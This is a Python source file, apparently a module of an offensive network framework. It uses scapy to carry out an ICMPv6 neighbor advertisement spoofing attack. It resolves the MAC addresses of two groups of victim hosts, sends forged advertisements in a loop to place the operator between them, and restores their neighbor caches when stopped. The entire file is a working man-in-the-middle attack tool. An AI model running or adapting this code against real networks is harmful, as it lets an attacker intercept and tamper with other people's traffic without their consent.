from deadbeef_modules import ipv6module

from scapy.all import *

# icmpv6 mitm module
class ipv6_mitm_module(ipv6module):
    """
    do an icmpv6 neighbor advertisement spoofing to put yourself in a mitm position
    """
    
    def init_module(self):
        self.prompt = self.cc.prompt(self.prompt, "icmpv6 mitm")                    
        self.valid_parameters = ['iface', 'group1', 'group2']
        self.help_parameters['iface'] = "use this interface"
        self.help_parameters['group1'] = "group A for MITM attack (comma separated)"
        self.help_parameters['group2'] = "group B for MITM attack (comma separated)"
        self.required_parameters = ['iface', 'group1', 'group2']
                
    def help(self):
        print "uses icmpv6 neighbor advertisements to spoof mac addresses"

    def start(self, cmdline):
        conf.iface6 = self.parameters['iface']

        self.mac_address = self.__get_mac__(self.parameters['iface'])
        if not self.mac_address:
            self.cc.err("unable to obtain mac address\n")
            return

        # create lists of victims
        self.grp1 = []
        self.grp2 = []                
        self.victims = []        
        
        for ip in self.parameters['group1'].split(','):
            self.grp1.append(ip.strip())
            
        for ip in self.parameters['group2'].split(','):
            self.grp2.append(ip.strip())
        
        self.victims.extend(self.grp1)
        self.victims.extend(self.grp2)
        self.victims = dict.fromkeys(self.victims)

        # get victims mac addresses (for re-na'ing)
        self.cc.ok("retrieving mac addresses from victims...\n")
        for ip in self.victims.keys():
            ns = IPv6()/ICMPv6ND_NS(tgt=ip)/ICMPv6NDOptDstLLAddr(lladdr=self.mac_address)
            na = sr1(ns, verbose=0, timeout=1)        
            
            if not na:
                self.cc.err("unable to retrieve the mac address for " + ip + ".\n")
                return
                
            self.cc.ok(ip + " -> " + na[ICMPv6NDOptDstLLAddr].lladdr + "\n")
            self.victims[ip] = na[ICMPv6NDOptDstLLAddr].lladdr

        self.cc.ok("starting icmpv6 mitm attack...\n")
        
        spoof_p = []        
        
        # create poisoning thread   
        for ip in self.parameters['group1'].split(','):
            tgt = ip.strip()
            for ip_src in self.parameters['group2'].split(','):
                ip_src = ip_src.strip()

                spoof_p.append(Ether()/IPv6(dst=tgt, src=ip_src)/ICMPv6ND_NA(tgt=ip_src, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=self.mac_address))
                spoof_p.append(Ether()/IPv6(dst=ip_src, src=tgt)/ICMPv6ND_NA(tgt=tgt, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=self.mac_address))
                
        arguments = {'verbose': 0, 'loop': 1, 'inter': 1}
        
        self.add_job(cmd = sendp, args = (spoof_p, ), kwargs = arguments)

    def stop(self, cmdline):
        self.cc.ok("stopping icmpv6 mitm attack (reseting client neighbor cache)...\n")             
        self.thread.terminate()
        
        na = []
        
        # reset the clients neighbor cache to the original values
        for ip in self.grp1:
            for ip_src in self.grp2:
                na.append(Ether()/IPv6(dst=ip, src=ip_src)/ICMPv6ND_NA(tgt=ip_src, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=self.victims[ip_src]))
                na.append(Ether()/IPv6(dst=ip_src, src=ip)/ICMPv6ND_NA(tgt=ip, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=self.victims[ip]))

        sendp(na, verbose=0, inter=0)
                
        self.is_stopped()       

#TODO: checken warum man erst discovern muss (getmacfromip?)
